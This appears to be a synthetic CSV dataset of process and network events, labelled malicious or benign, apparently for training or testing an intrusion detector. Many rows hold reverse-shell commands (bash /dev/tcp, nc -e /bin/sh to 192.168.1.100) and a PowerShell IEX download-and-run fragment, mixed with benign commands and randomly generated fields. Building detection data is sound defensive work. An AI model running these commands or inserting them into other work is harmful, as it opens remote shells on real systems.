timestamp,process_id,parent_process,child_process,source_ip,destination_ip,destination_port,protocol,bytes_sent,bytes_received,duration,command_executed,is_malicious
2025-03-19 02:16:44.763160,9f2c0335,init,cmd.exe,42.39.175.119,21.227.161.24,1337,TCP,1816,1203,46.15,ls,0
2025-03-25 11:26:46.121623,2a3b1caf,systemd,notepad.exe,51.198.82.66,219.208.133.30,443,TCP,314,653,18.2,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-06 14:37:46.097684,be6917a0,svchost.exe,nc,51.172.237.177,41.62.6.34,3389,UDP,3115,3636,27.28,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-27 16:02:45.284486,13cb948e,explorer.exe,perl,50.221.133.7,34.9.123.99,22,UDP,3125,871,5.19,cd,0
2025-04-27 16:16:45.335190,5fb74f33,svchost.exe,explorer.exe,135.2.156.21,153.105.80.148,4444,UDP,3452,2084,47.06,ls,0
2025-04-14 03:11:45.584815,7d5f1d2f,systemd,nc,91.42.111.42,35.64.44.122,3389,UDP,2157,4541,57.23,ipconfig,0
2025-04-04 12:00:46.373054,fb79b71c,init,explorer.exe,219.78.81.170,136.78.151.167,22,TCP,3680,2400,1.02,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-18 17:08:45.411772,4b22d474,explorer.exe,powershell,245.153.54.199,211.249.126.130,22,TCP,1137,1447,4.0,ping,0
2025-04-21 20:13:45.722205,0286af14,svchost.exe,cmd.exe,90.152.244.84,109.127.182.81,8080,UDP,759,3250,11.49,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-03 15:05:45.997891,71b1d2cf,systemd,explorer.exe,20.44.96.31,16.147.175.107,1337,UDP,1755,2353,58.95,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-26 10:38:45.305677,44b46738,systemd,powershell,147.37.174.5,176.251.60.156,443,TCP,3320,4342,55.53,ping,0
2025-03-16 21:14:45.973823,a1ac0600,explorer.exe,cmd.exe,48.235.126.155,47.144.122.60,22,TCP,3162,251,38.44,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-02-28 23:07:46.369289,546987dd,svchost.exe,python.exe,115.87.157.10,9.231.225.242,22,TCP,4157,2979,9.44,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-02 20:26:45.437006,820c0178,systemd,powershell,31.18.241.24,93.110.127.111,8080,TCP,554,4840,48.76,ls,0
2025-02-21 03:10:44.718516,e0edc797,systemd,notepad.exe,56.190.124.71,186.151.251.195,3389,UDP,873,1640,17.85,ping,0
2025-04-17 13:08:46.409950,59e2a057,svchost.exe,explorer.exe,36.140.94.131,30.7.97.202,22,TCP,4890,2702,19.93,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-13 05:33:45.168033,5b598c24,explorer.exe,chrome.exe,8.119.90.114,121.225.101.100,22,TCP,63,1894,1.13,cd,0
2025-04-20 07:06:46.215906,076c0fd4,init,perl,161.178.23.87,248.116.20.2,22,UDP,434,975,5.02,"python -c 'import socket,subprocess'",1
2025-04-18 04:34:46.078327,19d46b93,systemd,chrome.exe,68.176.4.118,198.147.105.242,8080,TCP,3118,4893,5.13,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-23 06:25:44.749402,4508d8da,systemd,chrome.exe,228.149.232.194,163.208.1.194,443,TCP,3760,4402,17.56,ipconfig,0
2025-04-17 04:33:45.614179,6174daca,init,powershell,6.150.21.207,102.250.29.116,1337,UDP,4194,825,4.42,ls,0
2025-03-11 03:35:45.980071,3b53dc19,explorer.exe,svchost.exe,207.98.29.100,20.106.191.157,8080,UDP,2687,1472,40.96,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-29 22:49:45.631254,18c654a6,explorer.exe,notepad.exe,54.213.184.70,52.87.204.124,8080,TCP,2850,1011,39.75,dir,0
2025-03-04 08:38:45.696594,07c62681,systemd,python.exe,247.125.51.18,183.111.32.189,1337,UDP,1602,3870,12.58,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-01 10:55:44.803904,637bcba5,systemd,explorer.exe,220.64.50.80,118.75.47.68,8080,TCP,932,203,18.15,cd,0
2025-03-13 21:19:44.976752,bc1a2047,init,nc,28.202.89.13,230.98.139.84,443,UDP,3173,160,30.42,ipconfig,0
2025-04-30 01:39:44.892311,848497dc,explorer.exe,nc,85.231.177.161,178.227.151.198,3389,TCP,3068,4170,47.52,ping,0
2025-04-22 21:52:45.521991,7fbbccec,init,perl,213.184.13.238,241.145.42.218,4444,UDP,559,856,34.0,ping,0
2025-03-25 16:38:45.108967,8a7b2400,systemd,python.exe,67.14.199.215,86.128.205.8,22,TCP,3415,2085,10.31,ping,0
2025-04-22 03:05:46.353645,d7f4ca5b,init,bash,185.53.228.192,93.130.25.32,1337,TCP,3390,413,32.63,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-14 13:22:46.276597,ac0980cc,systemd,cmd.exe,56.235.11.111,240.44.65.3,443,TCP,4206,356,44.9,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-21 08:00:45.039716,20a3a497,explorer.exe,chrome.exe,122.107.93.167,111.87.113.213,22,UDP,3524,1285,4.15,ping,0
2025-04-10 13:40:44.889024,3f925eeb,systemd,explorer.exe,54.245.160.196,251.92.62.154,4444,TCP,3303,392,31.36,ipconfig,0
2025-04-06 22:45:45.437596,625e53f7,svchost.exe,python.exe,133.207.7.11,168.245.42.98,1337,UDP,4942,3613,56.79,ipconfig,0
2025-03-09 18:22:45.222362,962ddbdf,explorer.exe,powershell,149.159.82.67,89.162.74.231,3389,UDP,1291,2755,13.47,dir,0
2025-04-11 22:05:45.035662,25c2045e,systemd,bash,215.222.215.104,196.211.35.187,1337,UDP,846,498,14.05,ping,0
2025-03-13 04:34:45.227067,107fe068,systemd,svchost.exe,5.221.141.76,244.102.89.98,1337,UDP,1545,1632,10.67,ping,0
2025-03-10 02:08:44.745794,7d754b13,systemd,svchost.exe,185.70.206.61,143.111.220.98,443,TCP,1275,3924,48.36,ls,0
2025-03-08 01:06:45.089170,677f350d,systemd,python.exe,3.185.200.95,131.212.224.170,443,UDP,4321,1431,19.82,dir,0
2025-03-13 09:03:46.286409,5ffe25dc,systemd,explorer.exe,90.99.166.221,172.93.221.239,1337,TCP,2288,4792,50.64,"python -c 'import socket,subprocess'",1
2025-04-26 23:22:46.178030,24434116,systemd,svchost.exe,19.144.244.28,65.113.158.47,1337,TCP,91,1340,25.9,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-17 11:31:45.614354,c61afb7d,init,python.exe,149.207.92.135,114.94.185.181,22,TCP,1412,4472,18.37,ipconfig,0
2025-04-11 18:09:45.667304,21c02d4d,systemd,python.exe,215.109.169.197,178.226.72.129,22,UDP,1874,3166,42.65,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-08 08:24:45.746978,6a262f24,init,bash,233.204.50.91,51.220.131.134,8080,UDP,3977,884,56.4,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-20 21:25:46.223990,0a3763b3,explorer.exe,nc,10.34.208.247,82.222.177.165,443,TCP,3693,3669,56.17,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-25 23:58:44.833456,6a7d0e99,explorer.exe,chrome.exe,227.118.210.68,39.142.112.216,1337,UDP,1550,2867,6.75,dir,0
2025-04-27 16:00:45.919885,9166c46a,systemd,python.exe,237.214.2.126,214.90.166.63,8080,UDP,2523,959,24.27,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-02-25 18:18:45.919519,17507bbc,explorer.exe,bash,28.179.90.35,165.78.69.242,8080,UDP,3136,463,8.81,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-11 17:59:46.354817,b771786d,explorer.exe,perl,86.254.113.172,53.177.37.222,8080,UDP,2132,3134,7.59,"python -c 'import socket,subprocess'",1
2025-02-24 07:11:45.135868,b4298022,svchost.exe,notepad.exe,251.209.63.209,153.20.28.86,3389,UDP,1715,407,6.94,dir,0
2025-04-08 01:50:46.003462,97e00656,systemd,python.exe,47.186.47.14,32.24.133.2,4444,UDP,1424,2369,46.64,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-28 13:09:45.045431,a0a3a8a3,systemd,cmd.exe,26.238.226.31,101.51.138.108,22,TCP,795,122,31.84,dir,0
2025-03-03 02:52:44.892877,7c780d26,explorer.exe,nc,216.99.69.243,186.107.192.174,22,TCP,3153,772,15.69,ipconfig,0
2025-04-22 02:24:44.835783,9551786b,svchost.exe,perl,79.156.106.56,125.234.144.130,22,TCP,4751,1780,31.58,ipconfig,0
2025-02-24 03:28:45.633333,d39630e0,svchost.exe,powershell,102.101.49.84,250.95.49.89,4444,UDP,3559,1396,47.65,ipconfig,0
2025-04-01 09:12:45.552586,b4b1d0d9,init,notepad.exe,47.145.39.27,115.216.132.92,8080,TCP,1596,4648,29.97,ping,0
2025-03-26 18:48:44.951556,46e11b89,svchost.exe,powershell,249.170.252.156,147.135.78.38,22,TCP,1925,1584,56.53,ping,0
2025-03-31 21:20:45.533548,15f2ecad,systemd,bash,195.216.25.169,180.87.223.46,1337,TCP,292,2744,58.09,ping,0
2025-03-01 23:35:45.962525,5709e25e,systemd,powershell,23.124.102.210,235.41.42.28,1337,TCP,4091,4355,38.08,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-21 06:08:45.637921,09b0709a,systemd,python.exe,203.190.124.246,115.177.200.135,443,TCP,109,4984,34.11,ls,0
2025-02-21 03:08:45.950004,12160201,init,svchost.exe,106.78.154.233,252.88.28.2,4444,UDP,4147,3387,54.04,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-15 03:08:44.870018,d1baf261,init,nc,138.226.166.83,109.38.168.242,1337,TCP,3737,956,34.9,ls,0
2025-04-12 01:22:45.737788,d5fc9263,init,nc,83.217.69.73,220.18.21.108,4444,TCP,1142,2884,56.69,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-28 03:18:45.294243,b7b8730f,systemd,powershell,250.131.5.155,161.104.206.162,3389,TCP,4121,2947,34.38,ipconfig,0
2025-03-06 11:26:45.242376,ca1586de,init,notepad.exe,94.147.22.20,14.24.243.72,22,UDP,1437,111,51.62,ipconfig,0
2025-02-25 15:27:45.620115,7f6ecb50,systemd,bash,129.108.106.212,150.62.130.254,8080,TCP,3757,618,52.51,ping,0
2025-03-21 11:05:45.159640,ff97f745,init,explorer.exe,8.251.17.201,234.63.52.11,443,UDP,165,1509,21.52,ping,0
2025-03-15 07:36:44.856867,51b06119,init,python.exe,248.60.27.97,9.34.181.34,8080,UDP,2026,2082,3.27,cd,0
2025-04-19 14:19:45.329031,6a452d67,systemd,explorer.exe,202.66.253.21,91.219.21.124,443,UDP,2655,4426,15.02,dir,0
2025-03-20 05:39:45.852079,480cb777,init,notepad.exe,99.52.109.120,124.182.188.119,4444,TCP,2317,1552,38.26,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-07 22:07:45.611196,3c920c80,svchost.exe,explorer.exe,148.141.146.253,228.39.211.75,4444,UDP,938,1310,4.8,ls,0
2025-03-09 13:48:44.992369,271516bf,explorer.exe,chrome.exe,139.54.23.129,166.140.135.169,8080,TCP,3306,3480,24.06,ls,0
2025-04-05 18:15:45.993173,e5742ed4,svchost.exe,bash,116.214.33.239,57.246.225.112,8080,UDP,178,3565,31.39,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-28 17:05:45.810094,993ea4ce,init,nc,30.166.26.137,35.194.109.20,22,TCP,2464,590,45.95,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-05 21:34:45.454524,e58b00af,explorer.exe,bash,51.246.160.113,84.155.68.136,3389,TCP,633,2237,3.12,ipconfig,0
2025-02-23 03:33:45.023065,bc966f31,explorer.exe,powershell,48.173.110.64,128.233.227.188,4444,UDP,4350,4336,51.71,ipconfig,0
2025-03-16 16:58:46.324949,494f41d7,explorer.exe,explorer.exe,227.140.146.151,242.227.36.66,22,UDP,4905,3806,28.43,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-26 02:11:44.754110,23ffaf51,svchost.exe,nc,161.245.69.153,169.2.85.249,22,UDP,2711,4712,7.85,dir,0
2025-03-04 20:19:44.891468,9b83bf97,explorer.exe,chrome.exe,173.164.122.132,136.91.145.140,3389,TCP,4879,1458,1.01,ipconfig,0
2025-03-21 20:13:45.210057,f47ba83c,init,nc,58.60.239.1,20.226.253.163,3389,TCP,4569,4062,37.89,ls,0
2025-03-17 12:04:44.886591,665090aa,init,python.exe,16.170.106.193,222.217.254.137,22,TCP,4178,1766,59.55,ipconfig,0
2025-03-28 06:40:45.653009,ef648266,init,chrome.exe,35.179.167.125,163.83.7.64,8080,TCP,2326,2521,3.74,cd,0
2025-02-22 09:06:44.833936,9dd2669b,explorer.exe,cmd.exe,50.230.22.134,218.182.52.166,4444,TCP,3620,3101,13.58,dir,0
2025-03-29 05:24:44.964099,15a1e017,svchost.exe,nc,122.157.237.70,240.97.100.222,3389,UDP,1725,1575,16.71,ping,0
2025-02-24 08:14:45.323075,c0109fa6,svchost.exe,cmd.exe,244.234.100.235,103.121.53.24,3389,TCP,718,1290,25.38,ls,0
2025-03-06 13:18:44.877280,daed8992,init,bash,34.68.221.109,240.155.79.163,8080,UDP,1427,4898,11.84,ipconfig,0
2025-03-03 09:44:45.888571,a0f355fe,init,notepad.exe,118.39.220.81,124.2.105.17,443,TCP,4181,1955,23.29,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-27 20:21:45.652588,b905c7a2,svchost.exe,svchost.exe,224.20.175.176,141.56.23.138,3389,UDP,1225,1550,8.49,ping,0
2025-04-11 17:31:45.017286,e8837b14,systemd,powershell,81.238.228.215,130.229.31.73,443,UDP,1962,2646,2.27,ls,0
2025-05-01 09:49:45.578011,346751eb,systemd,perl,155.44.41.58,209.132.254.163,8080,TCP,2384,1701,18.23,ls,0
2025-03-24 23:45:45.473846,7a618e6a,systemd,powershell,23.239.172.166,21.232.19.109,3389,TCP,2356,2334,27.09,cd,0
2025-02-28 16:24:45.149958,733f7a5b,svchost.exe,powershell,240.88.115.138,137.66.54.77,8080,UDP,4636,2945,0.54,dir,0
2025-04-11 00:38:46.242548,7dd01f32,init,python.exe,191.57.252.9,79.92.173.83,1337,UDP,2487,248,6.51,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-18 09:12:44.938325,92364e19,svchost.exe,powershell,147.247.37.177,173.38.9.102,3389,TCP,4716,4898,54.15,ping,0
2025-03-11 09:36:45.830205,ffabee6c,systemd,svchost.exe,185.85.67.85,92.203.30.115,22,TCP,4943,4010,32.84,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-04 13:49:45.990407,49c4a235,init,python.exe,162.14.36.143,145.34.75.26,443,TCP,4953,4614,38.38,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-22 03:52:45.063738,f23a449e,svchost.exe,cmd.exe,100.93.52.18,182.187.128.231,1337,UDP,2819,4682,25.19,cd,0
2025-02-22 18:32:45.269438,6852ca4f,svchost.exe,explorer.exe,159.28.227.76,89.234.209.54,22,UDP,2916,2209,11.61,cd,0
2025-03-21 09:34:46.225917,2b9ea892,explorer.exe,nc,1.110.18.184,162.241.177.89,4444,UDP,657,3446,40.69,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-23 15:01:46.143588,62f140d9,svchost.exe,cmd.exe,21.142.217.179,8.156.60.83,4444,UDP,3347,2933,39.24,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-19 00:40:45.687278,f531fcf1,svchost.exe,cmd.exe,193.7.175.120,21.36.18.191,8080,UDP,3731,1494,16.78,"python -c 'import socket,subprocess'",1
2025-04-09 17:32:44.785707,89faba6f,svchost.exe,bash,105.32.239.165,172.242.172.142,1337,UDP,1768,3926,39.41,ping,0
2025-04-22 18:57:46.137611,2397ea5e,svchost.exe,bash,90.210.204.242,185.142.86.20,443,UDP,4443,360,28.29,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-30 12:43:45.042582,618fc117,systemd,nc,42.18.235.205,147.53.7.79,22,TCP,4309,2494,33.5,ipconfig,0
2025-04-09 01:55:45.186118,5a7df7e1,init,powershell,169.246.173.23,112.154.81.123,1337,UDP,1275,1773,1.49,ping,0
2025-03-02 01:32:45.066965,860f66f8,explorer.exe,cmd.exe,188.44.172.139,27.108.79.245,4444,TCP,4373,943,2.16,cd,0
2025-02-28 09:00:44.821148,faa182d0,systemd,notepad.exe,145.221.104.75,67.11.48.223,3389,TCP,2689,2016,45.81,cd,0
2025-04-19 03:19:45.418830,e9e76849,init,svchost.exe,95.13.83.64,141.108.122.249,4444,UDP,299,218,6.53,ipconfig,0
2025-03-15 13:02:46.196342,bdd4ed3e,systemd,explorer.exe,174.43.16.40,244.84.56.213,22,TCP,4818,948,51.41,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-23 01:01:45.022680,36aef214,init,nc,166.198.19.216,174.177.225.245,3389,UDP,3355,925,41.32,cd,0
2025-03-19 06:01:45.900508,c42d486a,svchost.exe,perl,155.238.90.251,201.120.106.225,4444,TCP,2517,854,19.39,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-22 22:19:44.866553,07c416bb,systemd,explorer.exe,52.48.249.161,9.119.161.228,4444,UDP,91,2853,9.36,ipconfig,0
2025-04-25 01:24:44.715818,f76af850,systemd,cmd.exe,172.125.55.139,34.186.240.226,3389,UDP,2040,3924,48.47,ls,0
2025-04-07 09:14:44.797232,14afbaf8,svchost.exe,perl,170.138.159.207,235.64.179.250,3389,UDP,4551,3657,18.77,ipconfig,0
2025-04-23 21:44:45.652435,f674b166,explorer.exe,perl,141.41.125.20,67.69.123.107,3389,TCP,3165,137,54.21,ipconfig,0
2025-04-06 18:57:45.682351,693ec098,init,cmd.exe,250.227.12.203,237.61.154.225,443,UDP,367,4442,22.05,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-17 13:40:44.883803,b785c799,init,svchost.exe,129.151.121.196,125.154.176.89,22,TCP,2517,3128,27.14,dir,0
2025-02-24 17:05:46.228938,52ac183e,svchost.exe,powershell,68.235.219.155,127.189.143.193,22,UDP,285,2578,57.31,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-02 15:17:45.847014,3df06dac,init,svchost.exe,221.234.106.3,225.156.207.89,22,UDP,3485,887,4.71,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-05 08:07:46.274731,a41b93c7,systemd,bash,55.118.17.221,95.35.125.84,4444,UDP,194,2503,59.53,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-20 12:52:45.818575,6a05a0b0,svchost.exe,bash,251.168.99.132,116.123.220.122,443,UDP,4822,3985,27.23,"python -c 'import socket,subprocess'",1
2025-04-02 12:38:44.781195,98155f19,explorer.exe,perl,174.246.17.146,68.187.215.82,8080,UDP,3985,3084,30.03,cd,0
2025-03-03 12:39:45.936794,4b8b1e71,systemd,powershell,15.124.2.7,107.201.33.136,443,UDP,4479,3237,15.59,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-02-21 13:06:46.333387,24b9ada4,explorer.exe,cmd.exe,34.25.239.63,145.248.239.227,8080,TCP,1550,1888,58.44,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-06 18:56:45.814304,9809efae,explorer.exe,bash,169.143.89.151,42.30.75.242,1337,UDP,3991,2844,35.95,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-03 07:27:44.931117,42399c98,init,nc,131.110.115.115,222.86.86.1,22,UDP,1607,2660,29.1,cd,0
2025-03-30 23:52:44.985344,98bc0b08,systemd,nc,163.156.43.103,229.164.5.215,8080,TCP,4472,1108,15.02,ipconfig,0
2025-02-21 22:42:46.030995,119c03cc,systemd,python.exe,196.156.180.250,141.34.108.169,4444,TCP,861,2230,11.33,"python -c 'import socket,subprocess'",1
2025-02-22 02:09:46.076071,4a875b87,svchost.exe,python.exe,22.38.177.163,66.97.226.222,22,TCP,4746,1301,5.34,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-12 12:20:45.149767,068bd7b9,init,notepad.exe,158.163.95.27,148.72.100.237,3389,UDP,4340,3843,41.34,ls,0
2025-03-05 18:58:45.754136,0da2cebf,init,powershell,212.226.1.225,216.59.7.234,22,TCP,1030,808,42.64,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-27 22:28:46.199137,afc05383,systemd,powershell,139.5.73.84,233.250.183.103,3389,TCP,1419,4587,51.51,"python -c 'import socket,subprocess'",1
2025-03-27 11:01:45.685723,bfc2219c,init,nc,224.153.178.134,170.27.29.241,22,UDP,424,4568,16.13,"python -c 'import socket,subprocess'",1
2025-03-08 23:51:45.606989,27ced476,init,notepad.exe,111.247.143.7,67.225.47.189,8080,TCP,2433,716,10.51,dir,0
2025-04-22 05:39:46.081498,9070fbb5,init,powershell,179.149.221.193,125.24.98.199,8080,UDP,3786,2384,6.43,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-07 18:10:46.221373,a8bf4e8b,svchost.exe,nc,121.100.66.212,194.80.110.73,8080,TCP,2076,3146,44.1,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-08 08:23:46.299819,b4c0a390,explorer.exe,chrome.exe,247.113.218.177,231.55.4.60,8080,TCP,1583,1470,47.41,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-29 09:10:45.608524,8422feac,init,perl,195.116.24.66,58.54.133.188,1337,UDP,2291,1415,39.77,ls,0
2025-04-30 22:21:45.411823,6c497ba6,systemd,python.exe,162.221.221.2,251.73.91.45,3389,UDP,1805,2931,52.87,ls,0
2025-04-21 20:22:45.970488,ec35f1a7,systemd,perl,23.190.195.198,228.223.11.102,22,UDP,2787,1867,20.21,"python -c 'import socket,subprocess'",1
2025-04-24 01:54:44.904966,eed98a82,init,perl,49.229.94.42,98.215.65.33,4444,TCP,977,3722,26.17,ipconfig,0
2025-03-02 20:45:46.221488,1b33db0c,init,perl,93.251.182.76,155.25.31.43,22,TCP,4255,4388,38.91,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-30 01:36:46.246205,c48495a3,explorer.exe,powershell,104.109.174.31,77.217.110.47,8080,TCP,1871,3871,31.99,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-06 21:36:45.088368,e0de57ac,init,nc,137.2.231.197,128.228.101.108,22,UDP,2132,2978,42.25,dir,0
2025-03-29 19:46:46.335782,12675118,svchost.exe,nc,174.79.119.162,61.27.12.9,3389,TCP,4478,1709,7.19,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-28 13:07:46.223827,0e689ba9,svchost.exe,svchost.exe,181.244.77.196,124.155.249.201,443,UDP,920,742,17.12,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-03-15 01:10:45.506536,d56f8009,svchost.exe,powershell,49.24.157.108,1.240.233.70,4444,TCP,896,4504,22.06,ping,0
2025-04-04 15:14:44.885593,26d3895a,explorer.exe,powershell,58.253.230.97,93.108.124.1,8080,TCP,4795,70,20.92,ping,0
2025-04-06 10:08:45.090268,428d065c,systemd,svchost.exe,24.124.184.59,193.226.129.73,3389,UDP,1311,3741,15.8,cd,0
2025-04-12 03:34:45.734602,b00cf62d,systemd,perl,2.80.247.83,106.32.233.211,22,TCP,4622,616,50.53,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-31 16:49:46.038373,ed761479,svchost.exe,cmd.exe,150.29.240.68,152.197.81.54,22,UDP,3558,437,34.38,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-14 00:53:45.310003,343b78d6,explorer.exe,perl,158.132.210.95,207.221.30.150,22,TCP,659,4210,10.66,cd,0
2025-03-05 01:38:45.487304,ad9c87df,systemd,bash,120.163.78.182,156.109.246.144,22,TCP,1054,369,26.16,cd,0
2025-04-08 14:04:45.242702,0a73bef6,init,python.exe,158.1.199.164,177.74.68.4,1337,TCP,1594,3243,35.14,ls,0
2025-04-21 06:52:45.658491,5342f329,systemd,svchost.exe,170.61.49.151,123.156.161.102,443,UDP,3204,152,54.15,dir,0
2025-04-27 21:12:45.546716,c459aec2,systemd,notepad.exe,14.72.223.126,59.242.221.134,443,TCP,4610,1939,23.82,ls,0
2025-03-17 19:27:45.783433,8afcc6e1,init,notepad.exe,251.32.112.228,138.130.219.106,3389,TCP,331,2022,33.85,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-18 01:50:45.066442,9d5a020f,init,notepad.exe,235.128.123.123,216.160.56.134,8080,UDP,230,2194,28.0,dir,0
2025-04-06 16:06:44.957327,70637d47,svchost.exe,svchost.exe,45.61.247.169,22.154.179.170,22,TCP,1213,2418,5.55,ping,0
2025-03-16 14:20:46.158104,47b9380a,init,nc,211.91.181.76,242.231.31.242,3389,TCP,2192,1805,23.81,nc -e /bin/sh 192.168.1.100 4444,1
2025-02-27 05:24:45.484110,a27066cf,explorer.exe,nc,1.218.241.201,207.144.170.194,443,TCP,1473,1167,23.72,ping,0
2025-02-24 07:45:46.033157,d7bd0ae5,svchost.exe,svchost.exe,41.132.213.154,187.195.131.11,22,TCP,767,4997,33.35,"python -c 'import socket,subprocess'",1
2025-03-20 20:02:46.113786,ffab5566,explorer.exe,cmd.exe,150.119.89.191,213.159.90.9,3389,TCP,1568,1718,28.66,nc -e /bin/sh 192.168.1.100 4444,1
2025-02-23 09:11:45.093254,e8b0310e,svchost.exe,explorer.exe,215.247.156.238,28.85.120.187,1337,UDP,2315,906,22.47,ipconfig,0
2025-04-07 01:33:45.816500,c244ed13,init,svchost.exe,204.96.54.154,196.173.173.140,4444,UDP,4115,3548,38.64,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-26 09:14:44.891420,d6003ec8,init,powershell,191.4.177.83,219.130.52.148,443,UDP,346,4294,13.23,ping,0
2025-02-23 02:26:45.025834,c2a42bc7,init,powershell,109.195.134.52,42.16.3.120,1337,TCP,4584,3267,19.8,ping,0
2025-04-29 11:53:46.204024,1b54049e,explorer.exe,svchost.exe,183.30.104.126,143.61.119.221,3389,UDP,3064,3618,50.9,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-18 19:25:45.357963,90027866,init,notepad.exe,84.148.204.34,228.129.128.23,4444,UDP,3450,2028,52.03,dir,0
2025-04-28 17:31:44.911922,862415b6,systemd,svchost.exe,168.137.112.116,34.5.123.91,3389,TCP,2293,2325,49.74,ping,0
2025-03-29 21:28:45.877525,94048b18,svchost.exe,perl,23.45.176.65,107.204.154.80,3389,UDP,2109,78,45.31,nc -e /bin/sh 192.168.1.100 4444,1
